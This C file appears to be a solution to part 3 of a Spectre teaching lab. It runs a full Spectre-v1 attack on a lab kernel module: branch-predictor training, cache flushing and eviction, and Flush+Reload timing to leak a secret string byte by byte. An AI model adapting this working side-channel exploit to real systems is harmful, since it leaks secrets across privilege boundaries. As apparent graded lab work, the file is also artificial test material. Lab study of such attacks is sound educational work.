#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#include "labspectre.h"
#include "labspectreipc.h"

static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

static void flush_shared_memory(char *shared_memory) {
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
    }
}

static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offset) {
    size_t hit_counts[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};
    size_t best_index = 0, second_index = 0;
    size_t total_attempts = 700;

    // Cache eviction buffer setup
    const size_t eviction_size = 4 * 1024 * 1024;
    static char *eviction_buffer = NULL;
    if (!eviction_buffer) {
        eviction_buffer = malloc(eviction_size);
        if (eviction_buffer) memset(eviction_buffer, 1, eviction_size);
    }

    // Two-tier attempt system
    for (int tier = 0; tier < 2; tier++) {
        for (size_t attempt = 0; attempt < total_attempts; attempt++) {
            
            // 1. Train Predictor
            for (int train = 0; train < 48; train++) {
                call_kernel_part3(kernel_fd, shared_memory, train & 0x3);
            }

            // 2. Flush and Thrash
            flush_shared_memory(shared_memory);
            if (eviction_buffer) {
                volatile uint64_t sink = 0;
                for (size_t k = 0; k < eviction_size; k += 128) sink += eviction_buffer[k];
            }

            // 3. Victim Call
            call_kernel_part3(kernel_fd, shared_memory, offset);
            call_kernel_part3(kernel_fd, shared_memory, offset);

            // 4. Reload and Time (Pseudo-random stride)
            for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
                size_t mix_idx = ((i * 167) + 13) & 0xFF;
                char *addr = shared_memory + (mix_idx * SHD_SPECTRE_LAB_PAGE_SIZE);
                
                uint64_t latency = time_access(addr);

                if (latency <= 150) {
                    hit_counts[mix_idx]++;
                }
            }
        }

        // 5. Margin/Confidence Check
        size_t bc = 0, sc = 0;
        for (size_t j = 0; j < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; j++) {
            if (hit_counts[j] > bc) {
                sc = bc; second_index = best_index;
                bc = hit_counts[j]; best_index = j;
            } else if (hit_counts[j] > sc) {
                sc = hit_counts[j]; second_index = j;
            }
        }

        if (bc >= (sc + 12)) break;
        total_attempts = 1400; 
    }

    // Early Null-byte logic
    if (best_index == 0 && offset < 12) {
        size_t nz_best_idx = 1, nz_best_count = 0;
        for (size_t j = 1; j < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; j++) {
            if (hit_counts[j] > nz_best_count) {
                nz_best_count = hit_counts[j];
                nz_best_idx = j;
            }
        }
        return (char)nz_best_idx;
    }

    return (char)best_index;
}

int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    memset(leaked_str, 0, SHD_SPECTRE_LAB_SECRET_MAX_LEN);

    printf("Launching attacker\n");

    for (size_t current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte = leak_byte_at_offset(kernel_fd, shared_memory, current_offset);

        leaked_str[current_offset] = leaked_byte;

        // Terminate at Null once minimum length is met
        if (leaked_byte == '\x00' && current_offset >= 12) {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}